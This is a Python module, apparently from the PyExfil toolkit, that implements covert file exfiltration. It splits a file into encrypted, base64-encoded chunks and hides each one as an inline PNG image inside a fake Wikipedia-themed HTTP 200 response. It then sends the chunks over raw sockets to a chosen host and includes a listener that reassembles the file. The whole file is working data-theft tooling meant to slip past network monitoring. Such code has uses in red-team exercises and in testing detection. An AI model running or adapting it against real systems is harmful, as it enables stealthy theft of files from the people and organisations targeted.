#!/usr/bin/env python3

import sys
import time
import socket
import datetime

from pyexfil.includes.base import NetworkModule
from pyexfil.includes.prepare import PrepFile, DecodePacket, RebuildFile, DEFAULT_KEY

VEDGLAF = False

DEFAULT_TIMEOUT = 5
HTTP_RESPONSE_HEADER = """HTTP/1.1 200 OK
Date: TIME
Server: Apache/2.2.14 (Win32)
Last-Modified: Thu, 20 Sep 2018 19:15:56 ICT
Content-Length: LEN
Content-Type: text/html
Connection: Closed
"""

BODY = """
<html>
\t<head><title>Wikipedia | Aloha!</title></head>

\t<body>
\t\t<div>
\t\t    <p>Taken from Wikpedia</p>
\t\t    <img src="data:image/png;base64, B64" alt="Red dot COUNTER_LEN" />
\t\t</div>
\t</body>

</html>\r\n\r\n"""


class Assemble():
    def __init__(self, key=DEFAULT_KEY):
        self.counter = 0
        self.packets = []
        self.key = key

    def _append(self, data):
        if "/png;base64, " not in data:
            return False

        start = data.find("/png;base64, ") + len("/png;base64, ")
        end = data.find("\" alt=\"Red")

        if end == 0 or start == 0:
            return False

        self.packets.append(data[start:end])
        self.counter += 1
        sys.stdout.write("%s\n" % self.counter)
        return True

    def Build(self):
        decodedPckts = []
        for pckt in self.packets:
            decodedPckt = DecodePacket(pckt, enc_key=self.key, b64_flag=True)
            if decodedPckt is not False:
                decodedPckts.append(decodedPckt)
            else:
                sys.stderr.write("Error decoding packet at index %s."
                                 % self.packets.index(pckt))
        return RebuildFile(decodedPckts)


class HTTPRespExfil(NetworkModule):
    MODULE_NAME = "HTTPResp"
    PROTOCOL = "http/tcp"

    def __init__(self, host, port, fname, max_size=1024, enc_key=DEFAULT_KEY,
                 verbose=False):
        super().__init__(host=host, port=port, enc_key=enc_key,
                         max_packet_size=max_size, verbose=verbose)
        self.fname = fname
        self._packets = []
        self._pf = None
        self._build_packets()

    def _build_packets(self):
        self._pf = PrepFile(file_path=self.fname, kind="ascii",
                            max_size=self.max_packet_size, enc_key=self.enc_key)
        if self._pf is False:
            raise Exception("Cannot read file")
        total = len(self._pf['Packets'])
        for i in range(0, total):
            h = HTTP_RESPONSE_HEADER.replace(
                "TIME",
                datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")
            )
            b = BODY.replace("COUNT", str(i))
            pkt_val = self._pf['Packets'][i]
            if isinstance(pkt_val, bytes):
                pkt_val = pkt_val.decode()
            b = b.replace("B64", pkt_val)
            b = b.replace("LEN", str(total))
            h = h.replace("COUNTER", str(i))
            h = h.replace("LEN", str(len(b)))
            self._packets.append((h + b).encode())

    def _send_single_packet(self, index):
        s = socket.socket()
        s.settimeout(DEFAULT_TIMEOUT)
        try:
            s.connect((self.host, self.port))
        except socket.error as e:
            sys.stderr.write(str(e))
            return False
        s.send(self._packets[index])
        s.close()
        return True

    def _send_impl(self, data, **kwargs):
        check = 0
        for i in range(0, len(self._packets)):
            if VEDGLAF:
                f = True
            else:
                f = self._send_single_packet(i)
            if f is False:
                f = self._send_single_packet(i)
                if f is False:
                    sys.stderr.write("Error sending packet index %s.\n" % i)
                    continue
            check += 1
        if check == len(self._packets):
            sys.stdout.write("Finished sending %s packets.\n" % check)
            return True
        else:
            sys.stderr.write("Sent %s out of %s.\n" % (check, len(self._packets)))
            return False

    def _listen_impl(self, callback, **kwargs):
        addr = kwargs.get("addr", self.host)
        assembler = Assemble(key=self.enc_key)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((addr, self.port))
        sock.listen(5)
        sys.stdout.write("HTTPResp listener on %s:%s\n" % (addr, self.port))

        while not self._stop_event.is_set():
            conn, client_address = sock.accept()
            try:
                raw = conn.recv(65536)
                if raw:
                    text = raw.decode(errors="replace")
                    assembler._append(text)
                    result = assembler.Build()
                    if result:
                        callback(result if isinstance(result, bytes)
                                 else result.encode(),
                                 {"addr": client_address})
            finally:
                conn.close()


if __name__ == "__main__":
    sys.stdout.write(
        "This is meant to be a module for python and not a stand alone executable\n"
    )
